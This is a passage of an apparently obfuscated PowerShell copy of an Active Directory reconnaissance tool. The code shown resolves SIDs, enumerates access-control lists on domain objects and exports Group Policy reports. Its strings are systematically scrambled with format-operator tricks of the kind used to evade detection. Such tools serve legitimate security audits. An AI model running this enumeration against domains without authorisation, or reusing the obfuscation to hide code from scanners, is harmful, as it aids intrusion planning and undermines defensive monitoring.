                    ("{2}{0}{3}{1}"-f '1','551','S-','-5-32-')  { ((("{5}{2}{1}{6}{0}{3}{4}"-f 'c','o','INd7','kup Ope','rators','BUILT','Ba'))-rePLacE  'd7o',[ChAr]92) }
                    ("{2}{3}{0}{1}" -f '5','52','S-1-5-','32-')  { ((("{1}{2}{5}{3}{0}{4}"-f'licator','B','UILTI','iRep','s','NFs')).ReplaCE(([char]70+[char]115+[char]105),'\')) }
                    ("{0}{2}{1}" -f'S','32-554','-1-5-')  { ((("{9}{11}{3}{8}{4}{5}{2}{10}{6}{7}{1}{0}" -f 's','s','Com','-W','ows 20','00 ','Acc','e','ind','BUI','patible ','LTINJWzPre')) -CReplACe  ([ChAr]74+[ChAr]87+[ChAr]122),[ChAr]92) }
                    ("{1}{3}{0}{2}" -f'-5-','S','32-555','-1')  { ((("{8}{1}{6}{0}{7}{9}{4}{5}{2}{3}" -f '{0}Remot','U','r','s',' Us','e','ILTIN','e Des','B','ktop'))-f [CHar]92) }
                    ("{3}{1}{2}{0}" -f '-556','1-5-3','2','S-')  { ((("{9}{4}{8}{2}{1}{10}{0}{5}{7}{6}{11}{3}"-f'i',' C','ork','s','LTI','g','ation Op','ur','NbzANetw','BUI','onf','erator')).rEpLacE('bzA',[STRINg][CHAR]92)) }
                    ("{0}{1}{2}" -f'S','-1-5','-32-557')  { ((("{7}{4}{3}{1}{0}{2}{5}{6}"-f'g','min',' Forest T','ILTIN{0}Inco','U','rust Bui','lders','B')) -F  [CHAr]92) }
                    ("{2}{3}{0}{1}"-f'-5','-32-558','S','-1')  { ((("{6}{5}{4}{7}{0}{2}{3}{1}"-f'Performance M','s','onitor Us','er','i','UILTIN','B','5o')).RePlacE('i5o','\')) }
                    ("{2}{1}{3}{0}"-f '-559','-1-','S','5-32')  { ((("{1}{2}{0}{3}"-f 'manc','BUILTIN','spoPerfor','e Log Users'))-cREplACE  ([cHar]115+[cHar]112+[cHar]111),[cHar]92) }
                    ("{3}{0}{1}{2}" -f'1','-5','-32-560','S-')  { ((("{3}{0}{5}{1}{2}{4}{6}" -f'LTIN','ws Aut','horization Access Gro','BUI','u','KfTWindo','p'))  -repLACE'KfT',[Char]92) }
                    ("{1}{0}{2}"-f '32-5','S-1-5-','61')  { ((("{5}{1}{0}{7}{8}{2}{4}{3}{6}" -f 'Termi','LTINRUO','nse ','e','S','BUI','rvers','nal',' Server Lice'))  -REPLacE'RUO',[ChAR]92) }
                    ("{0}{1}{2}{3}"-f 'S-','1','-5-32-5','62')  { ((("{8}{1}{5}{0}{2}{4}{7}{6}{3}"-f'TINCG','I','IDistrib','s','uted C','L','er','OM Us','BU'))-repLACe'CGI',[chaR]92) }
                    ("{0}{2}{1}{3}" -f'S','-','-1-5','32-569')  { ((("{1}{8}{3}{7}{2}{4}{5}{6}{0}" -f'ors','BUILTI','hic O','}Cryp','p','e','rat','tograp','N{0'))-f  [cHAR]92) }
                    ("{1}{0}{2}" -f '-5','S-1-5-32','73')  { ((("{4}{0}{2}{5}{3}{1}"-f'I','ders','LT','ea','BU','INT5vEvent Log R')) -rEPlace'T5v',[cHar]92) }
                    ("{0}{2}{1}" -f 'S-','5-32-574','1-')  { ((("{2}{5}{6}{7}{12}{10}{0}{3}{4}{8}{9}{1}{11}" -f'ic','s','B','ate Serv','ice D','UI','L','TINjvR','COM ','Acce','if','s','Cert')).REpLace('jvR','\')) }
                    ("{0}{3}{2}{1}" -f'S','-32-575','5','-1-')  { ((("{1}{8}{4}{3}{6}{5}{2}{7}{0}" -f'rs','BU','Access Se','{0}R','TIN','emote ','DS R','rve','IL'))  -F  [cHaR]92) }
                    ("{2}{0}{3}{1}"-f'1-5-3','6','S-','2-57')  { ((("{4}{3}{5}{1}{2}{0}"-f'rvers','nt',' Se','dp','BUILTIN{0}RDS En','oi'))  -f[cHar]92) }
                    ("{2}{1}{0}" -f '32-577','1-5-','S-')  { ((("{6}{1}{0}{4}{3}{8}{5}{2}{7}"-f 'IN','T','ment Server','0}RD','{','e','BUIL','s','S Manag')) -f [ChaR]92) }
                    ("{2}{0}{3}{1}" -f'-','-578','S-1','5-32')  { ((("{1}{4}{5}{2}{6}{0}{7}{3}" -f'V A','B','INj','ministrators','U','ILT','UJHyper-','d'))-crEpLacE 'jUJ',[ChAr]92) }
                    ("{2}{1}{3}{0}" -f'79','1','S-','-5-32-5')  { ((("{3}{11}{0}{4}{13}{6}{5}{9}{12}{2}{8}{7}{1}{10}" -f'I','o',' Ope','B','LTINbdqAccess','t','on','t','ra','rol Ass','rs','U','istance',' C'))  -REpLACe  'bdq',[CHAr]92) }
                    ("{3}{0}{2}{1}"-f'1-5-32','80','-5','S-')  { ((("{0}{3}{1}{5}{2}{4}{6}" -f'BUIL','m','agement U','TIN{0}Re','s','ote Man','ers')) -f [cHAR]92) }
                    Default {
                        # based on Convert-ADName function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
                        If ( ($TargetSid -match ("{2}{0}{1}" -f '-.','*','^S-1')) -and ($ResolveSID) )
                        {
                            If ($Method -eq ("{0}{1}" -f'AD','WS'))
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter ('o'+'b'+'ject'+'Sid '+'-'+'eq '+"'$TargetSid'") -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning ("{8}{10}{0}{2}{5}{7}{9}{3}{4}{1}{6}"-f ' ','ng SI','Error wh','t us','i','ile','D',' enumerating Ob','[ConvertFrom-SID','jec',']')
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject.DistinguishedName
                                    $ADSOutput = $UserDomain + "\" + $ADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If ($Method -eq ("{1}{0}" -f'DAP','L'))
                            {
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.GetNetworkCredential()).UserName,($Credential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ([string]::IsNullOrEmpty($ADObject.Properties.samaccountname)) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject.Properties.distinguishedname))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ([string]::IsNullOrEmpty($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject NameTranslate
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(("{0}{1}" -f'InitE','x'),("{3}{2}{1}{0}" -f'thod','Me','voke','In'),$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.GetNetworkCredential()).UserName,$DomainFQDN,($Credential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid) using alternate credentials"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(("{1}{0}"-f'nit','I'),("{2}{0}{3}{1}"-f'keM','od','Invo','eth'),$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                If ($Init)
                                {
                                    [System.__ComObject].InvokeMember(("{3}{2}{1}{0}" -f'al','ferr','eRe','Chas'),("{1}{2}{3}{0}"-f'ty','Set','Prop','er'),$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember("Set",("{2}{0}{1}"-f 'Me','thod','Invoke'),$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput = [System.__ComObject].InvokeMember("Get",("{1}{2}{3}{0}"-f'thod','Inv','ok','eMe'),$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {
                                        #Write-Verbose "[ConvertFrom-SID] Error translating $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {
                #Write-Output "[ConvertFrom-SID] Error converting SID $($TargetSid)"
                #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}

# based on https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
Function Get-ADRACL
{
<#
.SYNOPSIS
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.DESCRIPTION
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.

.LINK
    https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}"-f'ADW','S'))
    {
        If ($Credential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning ("{2}{1}{4}{3}{0}{8}{5}{6}{7}" -f ' ','ef','D','ve','ault AD dri',' found ... Skipping ACL en','umera','tion','not')
                Return $null
            }
        }
        $GUIDs = @{("{9}{7}{5}{6}{2}{8}{4}{1}{3}{0}" -f'00000','0','00','0000','0','0000-00','00-0','000000-','0-0','00') = 'All'}
        Try
        {
            Write-Verbose ("{2}{1}{4}{3}{0}"-f ' schemaIDs','mer','[*] Enu','ting','a')
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter (("{1}{2}{3}{0}"-f '=*)','(sch','emaI','DGUID')) -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning ("{1}{8}{5}{9}{4}{3}{2}{0}{7}{6}" -f 'era','[Get-ADRA',' enum','while',' ','L] E','emaIDs','ting sch','C','rror')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.schemaIDGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose ("{5}{1}{6}{4}{3}{0}{2}" -f'e','ting ','ctory Rights',' Dir','e','[*] Enumera','Activ')
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{0}{5}{2}{1}{4}{3}{6}"-f'(obje','ces','controlAc','igh','sR','ctClass=','t)') -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning ("{2}{1}{8}{0}{5}{9}{7}{11}{3}{6}{12}{4}{10}" -f 'rro','Get-ADRAC','[','umerating Acti',' ','r whi','v',' e','L] E','le','Directory Rights','n','e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.rightsGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        # Get the DistinguishedNames of Domain, OUs, Root Containers and GroupPolicy objects.
        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{7}{8}{4}{0}{1}{6}{3}{2}{5}" -f'L]',' Er','n Contex','or getting Domai','AC','t','r','[Get-AD','R')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            Write-Verbose ("{8}{0}{10}{1}{13}{7}{6}{5}{2}{14}{3}{12}{4}{11}{9}"-f ']','at',' OU,','User,','ut','in,','oma',' D','[*','ts',' Enumer','er and Group Objec',' Comp','ing',' GPO, ')
            $Objs += Get-ADObject -LDAPFilter (((("{41}{18}{52}{25}{22}{1}{5}{19}{42}{44}{16}{20}{24}{54}{30}{14}{31}{58}{38}{27}{7}{33}{32}{17}{55}{0}{47}{48}{9}{40}{51}{6}{39}{10}{21}{2}{53}{50}{23}{15}{11}{45}{57}{4}{43}{36}{34}{56}{35}{12}{8}{28}{26}{13}{46}{37}{3}{29}{49}" -f 'tTy','main)(','Ty','nttype','4354','o',')','iner',')','5','cc','tt','ype=268435457','70912)(sam','a','samaccoun','aniza','mAcc','mD','bjectC','ti','ount','ss=do','05306369)(','onalunit','ectCla','counttype=5368','upPolicyConta','(samac','=53687091','bjectC','tegory=g','a',')(s','acco','t',')(sam','ccou','o','(samA','30','(','a','56','tegory=org','ype=26','a','pe=8','0','3))','=8','6368','W(obj','pe',')(o','oun','unt','8','r')) -REPlaCe  'mDW',[ChAR]124)) -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning ("{18}{3}{12}{14}{16}{13}{5}{4}{15}{21}{6}{8}{9}{0}{22}{17}{7}{10}{19}{1}{20}{2}{11}"-f'U, ','and Grou',' Obje','et-A',' e','e',' Domai','om','n',', O','put','cts','DR','il','ACL] Err','num','or wh',' C','[G','er ','p','erating','GPO, User,')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose ("{2}{3}{8}{4}{0}{6}{1}{5}{9}{7}" -f'ting ','ot','[*]',' E','ra',' Con','Ro','ner Objects','nume','tai')
                $Objs += Get-ADObject -SearchBase $($ADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter ("{1}{6}{5}{0}{3}{2}{4}" -f 'a','(obje','r','ine',')','lass=cont','ctC') -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning ("{6}{5}{4}{1}{2}{7}{9}{11}{8}{10}{3}{12}{0}" -f's','r ','w','iner O','t-ADRACL] Erro','e','[G','hile','t',' enum','a','erating Root Con','bject')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            Write-Verbose ("{1}{2}{0}" -f 'CLs','[-]',' DA')
            $DACLObj = [ADRecon.ADWSClass]::DACLParser($Objs, $GUIDs, $Threads)
            #Write-Verbose "[-] SACLs - May need a Privileged Account"
            Write-Warning ("{6}{10}{2}{0}{8}{3}{11}{1}{9}{12}{4}{13}{5}{7}"-f '- Currentl',' is ','s ','e','supported w',' LDA','[*] S','P.','y, th','only','ACL',' module',' ','ith')
            #$SACLObj = [ADRecon.ADWSClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($Method -eq ("{1}{0}" -f'AP','LD'))
    {
        $GUIDs = @{("{0}{3}{4}{5}{1}{2}"-f'0000000','0000','0','0','-0000-0000-','0000-0000000') = 'All'}

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f'omain','D'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{6}{11}{4}{3}{10}{2}{9}{0}{8}{1}{7}{5}" -f ' gett','ain ','ro','L','ADRAC','xt','[G','Conte','ing Dom','r','] Er','et-')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f'Fore','st'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                $SchemaPath = $ADForest.Schema.Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning ("{2}{1}{8}{7}{0}{6}{9}{10}{3}{5}{4}" -f'rro','Ge','[','tin','SchemaPath','g ','r','L] E','t-ADRAC',' e','numera')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $SchemaPath = $ADForest.Schema.Name
            Remove-Variable ADForest
        }

        If ($SchemaPath)
        {
            Write-Verbose ("{0}{6}{1}{5}{2}{3}{4}"-f '[*','E','ting',' ','schemaIDs','numera','] ')
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = ("{1}{2}{0}{3}"-f'U','(schema','IDG','ID=*)')

            Try
            {
                $SchemaSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning ("{2}{10}{0}{8}{9}{5}{7}{6}{1}{3}{4}" -f 'ADR','chema','[Get','ID','s','or en','S','umerating ','ACL]',' Err','-')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
                }
                $SchemaSearcher.dispose()
            }
            $objSearcherPath.dispose()

            Write-Verbose ("{5}{6}{1}{0}{3}{7}{4}{2}" -f'Activ',' Enumerating ','s','e Directo','ht','[','*]','ry Rig')
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = (("{7}{2}{4}{6}{3}{1}{5}{0}" -f 'Right)','ce','b','ntrolAc','jectClass=c','ss','o','(o'))

            Try
            {
                $RightsSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning ("{3}{1}{5}{2}{4}{11}{6}{7}{10}{9}{8}{0}"-f 'ts','ADRA','Er','[Get-','ror enumer','CL] ','g Ac','tive Di',' Righ','tory','rec','atin')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
                }
                $RightsSearcher.dispose()
            }
            $objSearcherPath.dispose()
        }

        # Get the Domain, OUs, Root Containers, GPO, User, Computer and Group objects.
        $Objs = @()
        Write-Verbose ("{6}{8}{11}{10}{12}{5}{2}{7}{13}{9}{1}{0}{4}{3}" -f 'up','o','ompu','s',' Object','C','[*] Enu','t','merati',' and Gr',' Domain, OU, GPO, Us','ng','er, ','er')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ((("{33}{41}{19}{18}{27}{53}{11}{46}{12}{56}{2}{45}{49}{39}{21}{0}{29}{61}{52}{5}{58}{6}{57}{13}{43}{48}{32}{59}{4}{17}{1}{22}{26}{54}{24}{16}{14}{40}{28}{42}{60}{51}{20}{44}{30}{55}{31}{7}{25}{36}{38}{34}{50}{47}{9}{8}{10}{3}{35}{37}{15}{23}"-f 'g','30','z','c','e','roup','yConta','2684','s','(','ama','teg','=orga','(','5306369)','70913)','tType=80','=805','o','(','4','e','6',')','Accoun','35','36','bjectC','ama','ory','sam','pe=','AccountT','(EJq(objectClas','53','counttype=5','457)(sama','368','ccounttype=','Cat','(s','s=domain)','cco','s','35456)(','ationalunit)(obj','ory','0912)','am','ect','687','ttype=268','g','a','8)(sam','accountty','ni','iner)','Polic','yp','un','=')).RePlace('EJq','|'))
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange((("{0}{1}{2}"-f'di','splayna','me'),("{5}{0}{4}{3}{1}{2}"-f'i','shedna','me','i','stingu','d'),("{0}{1}" -f 'na','me'),("{2}{4}{3}{1}{0}" -f 'tor','p','n','cri','tsecuritydes'),("{0}{2}{1}"-f'obj','s','ectclas'),("{1}{3}{2}{0}" -f 'tsid','obj','c','e')))
        $ObjSearcher.SearchScope = ("{1}{0}" -f'ee','Subtr')

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{4}{9}{2}{10}{7}{5}{6}{14}{3}{13}{11}{12}{1}{8}{0}"-f 'ts','nd','w','User, ','[Get-ADRACL] E','ating',' Domain, OU, G','umer',' Group Objec','rror ','hile en','puter',' a','Com','PO, ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        Write-Verbose ("{0}{1}{5}{6}{3}{2}{4}{7}{8}"-f '[','*] E',' C','Root','ont','numer','ating ','ainer Obje','cts')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (("{5}{4}{3}{0}{2}{1}" -f 'ss','container)','=','a','Cl','(object'))
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange((("{0}{3}{4}{1}{2}"-f 'dist','e','dname','i','nguish'),("{1}{0}" -f'e','nam'),("{3}{2}{0}{1}{4}"-f 'uritydescrip','t','c','ntse','or'),("{3}{1}{2}{0}"-f 'ss','ect','cla','obj')))
        $ObjSearcher.SearchScope = ("{0}{1}{2}"-f 'O','neLeve','l')

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{1}{6}{0}{7}{5}{8}{3}{9}{2}{4}" -f'rati','[Get-ADRACL] Error whil','bje','n','cts','g Root C','e enume','n','ontai','er O')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            Write-Verbose ("{2}{0}{1}" -f' D','ACLs','[-]')
            $DACLObj = [ADRecon.LDAPClass]::DACLParser($Objs, $GUIDs, $Threads)
            Write-Verbose ("{6}{9}{5}{4}{2}{10}{8}{7}{3}{1}{11}{0}"-f 'nt','ed','s - May','ileg','L','SAC','[-]','v',' a Pri',' ',' need',' Accou')
            $SACLObj = [ADRecon.LDAPClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType ("{0}{1}"-f'DAC','Ls')
        Remove-Variable DACLObj
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType ("{1}{0}" -f's','SACL')
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{
<#
.SYNOPSIS
    Runs the Get-GPOReport cmdlet if available.

.DESCRIPTION
    Runs the Get-GPOReport cmdlet if available and saves in HTML and XML formats.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.OUTPUTS
    HTML and XML GPOReports are created in the folder specified.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [bool] $UseAltCreds,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir
    )

    If ($Method -eq ("{0}{1}"-f'A','DWS'))
    {
        Try
        {
            # Suppress verbose output on module import
            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = ("{1}{2}{0}"-f 'Continue','Silen','tly')
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning ("{15}{5}{9}{18}{1}{12}{10}{20}{13}{17}{8}{0}{14}{7}{11}{3}{2}{4}{16}{19}{6}" -f't','RGP','Sk','dule. ','ipp','e','eport','roupPolic','r','t-A','port','y Mo','ORe','E','ing the G','[G','i','rror impo','D','ng GPOR','] ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return $null
        }
        Try
        {
            Write-Verbose ("{3}{1}{2}{0}" -f' XML','o','rt','[*] GPORep')
            $ADFileName = -join($ADROutputDir,'\',("{0}{1}{2}{3}" -f 'G','P','O-Repo','rt'),("{1}{0}" -f'l','.xm'))
            Get-GPOReport -All -ReportType XML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{6}{3}{0}{4}{5}{1}{7}{2}{8}"-f 'e t','sing','UN','th','ool',' u','[*] Run ',' R','AS.')
                Write-Warning ((("{2}{1}{8}{3}{6}{7}{5}{0}{4}{9}" -f 'owe','*] runas /user:<Dom','[','in FQDN>Z','rshel','rname> /netonly p','Vp<U','se','a','l.exe')).replaCE(([ChAr]90+[ChAr]86+[ChAr]112),[StRiNg][ChAr]92))
                Return $null
            }
            Write-Warning ("{3}{2}{7}{6}{8}{0}{5}{4}{1}{9}"-f'th','ort in','POR','[Get-ADRG','p','e GPORe','get','eport] Error ','ting ',' XML')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            Write-Verbose ("{3}{5}{4}{1}{2}{0}" -f 'L','t H','TM','[*] G','por','PORe')
            $ADFileName = -join($ADROutputDir,'\',("{2}{1}{0}{3}"-f'-','PO','G','Report'),("{1}{0}"-f'tml','.h'))
            Get-GPOReport -All -ReportType HTML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{7}{1}{0}{6}{2}{3}{4}{5}" -f 'Run t',' ','n','g R','U','NAS.','he tool usi','[*]')
                Write-Warning ((("{5}{14}{3}{0}{11}{2}{9}{1}{10}{16}{6}{4}{13}{15}{7}{12}{8}{17}"-f'ser','Us','<D','/u',' ','[*] run','>','owersh','ll','omain FQDN>k1P<','e',':','e','/','as ','netonly p','rname','.exe')) -RepLaCE  ([CHAR]107+[CHAR]49+[CHAR]80),[CHAR]92)
                Return $null
            }
